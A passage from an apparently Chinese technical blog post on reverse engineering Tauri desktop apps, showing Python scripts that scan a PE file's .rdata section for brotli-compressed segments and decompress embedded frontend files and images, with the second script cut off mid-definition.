f.read(size)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;成功提取.rdata段: 偏移 0x<span class="subst">&#123;offset:08x&#125;</span>, 大小 <span class="subst">&#123;size&#125;</span> 字节&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> rdata</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;提取.rdata段时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_brotli_segments</span>(<span class="params">data: <span class="built_in">bytes</span>, min_size: <span class="built_in">int</span> = <span class="number">10</span>, max_scan: <span class="built_in">int</span> = <span class="number">10000</span>, </span></span><br><span class="line"><span class="params">                           data_offset: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在二进制数据中查找所有可能的brotli压缩段</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        data: 原始字节数据</span></span><br><span class="line"><span class="string">        min_size: brotli段的最小大小</span></span><br><span class="line"><span class="string">        max_scan: 最大扫描长度(避免过长搜索)</span></span><br><span class="line"><span class="string">        data_offset: 数据在原文件中的偏移量(用于显示正确的文件位置)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        list: [(解压后的数据, 开始位置, 结束位置), ...]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    found_segments = []</span><br><span class="line">    data_len = <span class="built_in">len</span>(data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始扫描 <span class="subst">&#123;data_len&#125;</span> 字节的数据...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最小段大小: <span class="subst">&#123;min_size&#125;</span>, 最大扫描长度: <span class="subst">&#123;max_scan&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data_offset &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;数据偏移: 0x<span class="subst">&#123;data_offset:08x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有可能的起始位置</span></span><br><span class="line">    <span class="keyword">for</span> start_pos <span class="keyword">in</span> <span class="built_in">range</span>(data_len - min_size):</span><br><span class="line">        <span class="keyword">if</span> start_pos % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;扫描进度: <span class="subst">&#123;start_pos&#125;</span>/<span class="subst">&#123;data_len&#125;</span> (<span class="subst">&#123;start_pos/data_len*<span class="number">100</span>:<span class="number">.1</span>f&#125;</span>%)&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 限制扫描长度以提高效率</span></span><br><span class="line">        max_end = <span class="built_in">min</span>(start_pos + max_scan, data_len)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试不同的结束位置</span></span><br><span class="line">        <span class="keyword">for</span> end_pos <span class="keyword">in</span> <span class="built_in">range</span>(start_pos + min_size, max_end + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                candidate = data[start_pos:end_pos]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 尝试解压</span></span><br><span class="line">                decompressed = brotli.decompress(candidate)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查是否与已找到的段重叠</span></span><br><span class="line">                is_overlapping = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">for</span> _, existing_start, existing_end <span class="keyword">in</span> found_segments:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (end_pos &lt;= existing_start <span class="keyword">or</span> start_pos &gt;= existing_end):</span><br><span class="line">                        is_overlapping = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> is_overlapping:</span><br><span class="line">                    <span class="comment"># 计算在原文件中的绝对位置</span></span><br><span class="line">                    abs_start = data_offset + start_pos</span><br><span class="line">                    abs_end = data_offset + end_pos</span><br><span class="line">                    found_segments.append((decompressed, abs_start, abs_end))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n找到brotli段 #<span class="subst">&#123;<span class="built_in">len</span>(found_segments)&#125;</span>: 位置 0x<span class="subst">&#123;abs_start:08x&#125;</span>-0x<span class="subst">&#123;abs_end:08x&#125;</span> (长度:<span class="subst">&#123;abs_end-abs_start&#125;</span>), 解压后:<span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span>字节&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 跳过这个段的剩余部分以避免重复检测</span></span><br><span class="line">                    start_pos = end_pos - <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n扫描完成! 总共找到 <span class="subst">&#123;<span class="built_in">len</span>(found_segments)&#125;</span> 个brotli段&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> found_segments</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_multiple_brotli</span>(<span class="params">file_path: <span class="built_in">str</span>, output_dir: <span class="built_in">str</span> = <span class="literal">None</span>, min_size: <span class="built_in">int</span> = <span class="number">10</span>, </span></span><br><span class="line"><span class="params">                           max_scan: <span class="built_in">int</span> = <span class="number">10000</span>, save_raw: <span class="built_in">bool</span> = <span class="literal">False</span>, </span></span><br><span class="line"><span class="params">                           scan_rdata: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中提取所有brotli段</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        file_path: 输入文件路径</span></span><br><span class="line"><span class="string">        output_dir: 输出目录</span></span><br><span class="line"><span class="string">        min_size: 最小brotli段大小</span></span><br><span class="line"><span class="string">        max_scan: 最大扫描长度</span></span><br><span class="line"><span class="string">        save_raw: 是否保存原始压缩数据</span></span><br><span class="line"><span class="string">        scan_rdata: 是否只扫描PE文件的.rdata段</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        bool: 是否成功</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取文件: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        data_offset = <span class="number">0</span>  <span class="comment"># 数据在原文件中的偏移</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> scan_rdata:</span><br><span class="line">            <span class="comment"># 解析PE文件并提取.rdata段</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;模式: 扫描PE文件的.rdata段&quot;</span>)</span><br><span class="line">            parser = PEParser(file_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parser.parse():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">            data = parser.extract_rdata()</span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 获取.rdata段在文件中的偏移</span></span><br><span class="line">            rdata_info = parser.get_rdata_section()</span><br><span class="line">            <span class="keyword">if</span> rdata_info:</span><br><span class="line">                data_offset = rdata_info[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 读取整个二进制文件</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;模式: 扫描整个二进制文件&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;数据大小: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置输出目录</span></span><br><span class="line">        <span class="keyword">if</span> output_dir <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base_name = os.path.splitext(os.path.basename(file_path))[<span class="number">0</span>]</span><br><span class="line">            suffix = <span class="string">&quot;_rdata_extracted&quot;</span> <span class="keyword">if</span> scan_rdata <span class="keyword">else</span> <span class="string">&quot;_extracted&quot;</span></span><br><span class="line">            output_dir = <span class="string">f&quot;<span class="subst">&#123;base_name&#125;</span><span class="subst">&#123;suffix&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建输出目录</span></span><br><span class="line">        os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;输出目录: <span class="subst">&#123;output_dir&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查找所有brotli段</span></span><br><span class="line">        segments = find_all_brotli_segments(data, min_size, max_scan, data_offset)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> segments:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到任何brotli压缩段&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 保存每个段</span></span><br><span class="line">        <span class="keyword">for</span> i, (decompressed_data, start_pos, end_pos) <span class="keyword">in</span> <span class="built_in">enumerate</span>(segments, <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 保存解压后的数据</span></span><br><span class="line">            decompressed_file = os.path.join(output_dir, <span class="string">f&quot;segment_<span class="subst">&#123;i:03d&#125;</span>_decompressed.dat&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(decompressed_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(decompressed_data)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;段 <span class="subst">&#123;i&#125;</span>: 位置 0x<span class="subst">&#123;start_pos:08x&#125;</span>-0x<span class="subst">&#123;end_pos:08x&#125;</span>, 原始:<span class="subst">&#123;end_pos-start_pos:6d&#125;</span>字节, 解压:<span class="subst">&#123;<span class="built_in">len</span>(decompressed_data):6d&#125;</span>字节&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;      解压数据保存到: <span class="subst">&#123;decompressed_file&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 如果需要，保存原始压缩数据</span></span><br><span class="line">            <span class="keyword">if</span> save_raw:</span><br><span class="line">                raw_file = os.path.join(output_dir, <span class="string">f&quot;segment_<span class="subst">&#123;i:03d&#125;</span>_raw.br&quot;</span>)</span><br><span class="line">                <span class="comment"># 从原文件读取对应的数据段</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.seek(start_pos)</span><br><span class="line">                    raw_data = f.read(end_pos - start_pos)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(raw_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(raw_data)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;      原始数据保存到: <span class="subst">&#123;raw_file&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 尝试显示解压内容的预览</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># 尝试作为文本显示</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        preview = decompressed_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)[:<span class="number">100</span>]</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;      内容预览: <span class="subst">&#123;<span class="built_in">repr</span>(preview)&#125;</span><span class="subst">&#123;<span class="string">&#x27;...&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">100</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        <span class="comment"># 显示十六进制</span></span><br><span class="line">                        hex_preview = decompressed_data[:<span class="number">20</span>].<span class="built_in">hex</span>()</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;      十六进制预览: <span class="subst">&#123;hex_preview&#125;</span><span class="subst">&#123;<span class="string">&#x27;...&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">20</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 生成摘要文件</span></span><br><span class="line">        summary_file = os.path.join(output_dir, <span class="string">&quot;extraction_summary.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(summary_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&quot;Brotli提取摘要\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;================\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;源文件: <span class="subst">&#123;file_path&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;扫描模式: <span class="subst">&#123;<span class="string">&#x27;PE .rdata段&#x27;</span> <span class="keyword">if</span> scan_rdata <span class="keyword">else</span> <span class="string">&#x27;整个文件&#x27;</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;数据大小: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> scan_rdata <span class="keyword">and</span> data_offset &gt; <span class="number">0</span>:</span><br><span class="line">                f.write(<span class="string">f&quot;.rdata段偏移: 0x<span class="subst">&#123;data_offset:08x&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;找到段数: <span class="subst">&#123;<span class="built_in">len</span>(segments)&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;扫描参数: 最小大小=<span class="subst">&#123;min_size&#125;</span>, 最大扫描长度=<span class="subst">&#123;max_scan&#125;</span>\n\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> i, (decompressed_data, start_pos, end_pos) <span class="keyword">in</span> <span class="built_in">enumerate</span>(segments, <span class="number">1</span>):</span><br><span class="line">                f.write(<span class="string">f&quot;段 <span class="subst">&#123;i&#125;</span>:\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  位置: 0x<span class="subst">&#123;start_pos:08x&#125;</span> - 0x<span class="subst">&#123;end_pos:08x&#125;</span>\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  原始大小: <span class="subst">&#123;end_pos - start_pos&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  解压大小: <span class="subst">&#123;<span class="built_in">len</span>(decompressed_data)&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  压缩比: <span class="subst">&#123;<span class="built_in">len</span>(decompressed_data)/(end_pos-start_pos):<span class="number">.2</span>f&#125;</span>x\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  解压文件: segment_<span class="subst">&#123;i:03d&#125;</span>_decompressed.dat\n&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> save_raw:</span><br><span class="line">                    f.write(<span class="string">f&quot;  原始文件: segment_<span class="subst">&#123;i:03d&#125;</span>_raw.br\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取摘要保存到: <span class="subst">&#123;summary_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n总计提取了 <span class="subst">&#123;<span class="built_in">len</span>(segments)&#125;</span> 个brotli段&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;从二进制文件中提取所有brotli压缩段&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用示例:</span></span><br><span class="line"><span class="string">  # 扫描整个文件</span></span><br><span class="line"><span class="string">  python multi_brotli_extractor.py file.bin</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # 只扫描PE文件的.rdata段</span></span><br><span class="line"><span class="string">  python multi_brotli_extractor.py program.exe --scan-rdata</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # 自定义参数</span></span><br><span class="line"><span class="string">  python multi_brotli_extractor.py file.bin --output-dir extracted --save-raw --min-size 50</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;input_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入的二进制文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output-dir&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;输出目录路径 (默认: &#123;filename&#125;_extracted)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--min-size&#x27;</span>, <span class="string">&#x27;-m&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;brotli段的最小大小 (默认: 10)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--max-scan&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10000</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;单个段的最大扫描长度 (默认: 10000)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--save-raw&#x27;</span>, <span class="string">&#x27;-r&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;同时保存原始压缩数据&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--scan-rdata&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;只扫描PE文件的.rdata段&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--quiet&#x27;</span>, <span class="string">&#x27;-q&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;减少输出信息&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.quiet:</span><br><span class="line">        <span class="comment"># 重定向print到null</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        sys.stdout = <span class="built_in">open</span>(os.devnull, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    success = extract_multiple_brotli(</span><br><span class="line">        args.input_file,</span><br><span class="line">        args.output_dir,</span><br><span class="line">        args.min_size,</span><br><span class="line">        args.max_scan,</span><br><span class="line">        args.save_raw,</span><br><span class="line">        args.scan_rdata</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.quiet:</span><br><span class="line">        sys.stdout = sys.__stdout__</span><br><span class="line">    </span><br><span class="line">    sys.exit(<span class="number">0</span> <span class="keyword">if</span> success <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>半分钟才扫描0.2%，所以还是建议手动找到大体位置，然后dump下来，用第一段脚本直接处理少量数据</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919130806566.png" alt="image-20250919130806566"></p>
<p>还有一种是图片资源，这个应该怎么找呢，其实和index,html，main.js等等是一样的，都在同一个地方</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919140146802.png" alt="image-20250919140146802"></p>
<p>但是解压图片部分就不能用前面的可以寻找多段brotli数据的脚本了，因为可能被识别成多个拆分的部分，所以需要用解压单brotli的脚本来解压：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将十六进制字符串转换为字节&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 移除所有空白字符</span></span><br><span class="line">    hex_string = <span class="string">&#x27;&#x27;</span>.join(hex_string.split())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 确保是偶数长度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_string) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;十六进制字符串长度必须为偶数&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> binascii.unhexlify(hex_string)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;无效的十六进制格式: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brotli_data</span>(<span class="params">data: <span class="built_in">bytes</span>, head_offset: <span class="built_in">int</span> = <span class="number">0</span>, tail_offset: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在数据中查找有效的brotli压缩部分</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        data: 原始字节数据</span></span><br><span class="line"><span class="string">        head_offset: 从开头跳过的字节数</span></span><br><span class="line"><span class="string">        tail_offset: 从结尾跳过的字节数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        tuple: (解压后的数据, 开始位置, 结束位置) 或 None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt;= head_offset + tail_offset:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 数据长度(<span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>)小于偏移量总和(<span class="subst">&#123;head_offset + tail_offset&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 确定搜索范围</span></span><br><span class="line">    search_start = head_offset</span><br><span class="line">    search_end = <span class="built_in">len</span>(data) - tail_offset</span><br><span class="line">    search_data = data[search_start:search_end]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;搜索范围: <span class="subst">&#123;search_start&#125;</span> - <span class="subst">&#123;search_end&#125;</span> (长度: <span class="subst">&#123;<span class="built_in">len</span>(search_data)&#125;</span> 字节)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 从不同的起始位置开始尝试</span></span><br><span class="line">    <span class="keyword">for</span> start_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(search_data)):</span><br><span class="line">        <span class="keyword">if</span> start_pos % <span class="number">1000</span> == <span class="number">0</span> <span class="keyword">and</span> start_pos &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;搜索进度: <span class="subst">&#123;start_pos&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(search_data)&#125;</span> (<span class="subst">&#123;start_pos/<span class="built_in">len</span>(search_data)*<span class="number">100</span>:<span class="number">.1</span>f&#125;</span>%)&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试不同的结束位置</span></span><br><span class="line">        <span class="keyword">for</span> end_pos <span class="keyword">in</span> <span class="built_in">range</span>(start_pos + <span class="number">10</span>, <span class="built_in">len</span>(search_data) + <span class="number">1</span>):  <span class="comment"># 至少10字节</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                candidate = search_data[start_pos:end_pos]</span><br><span class="line">                decompressed = brotli.decompress(candidate)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 计算在原数据中的绝对位置</span></span><br><span class="line">                abs_start = search_start + start_pos</span><br><span class="line">                abs_end = search_start + end_pos</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n成功找到brotli数据!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置: <span class="subst">&#123;abs_start&#125;</span> - <span class="subst">&#123;abs_end&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;压缩大小: <span class="subst">&#123;abs_end - abs_start&#125;</span> 字节&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;解压大小: <span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span> 字节&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;压缩比: <span class="subst">&#123;<span class="built_in">len</span>(decompressed)/(abs_end - abs_start):<span class="number">.2</span>f&#125;</span>x&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> decompressed, abs_start, abs_end</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n未找到有效的brotli压缩数据&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_hex_file</span>(<span class="params">file_path: <span class="built_in">str</span>, head_offset: <span class="built_in">int</span> = <span class="number">0</span>, tail_offset: <span class="built_in">int</span> = <span 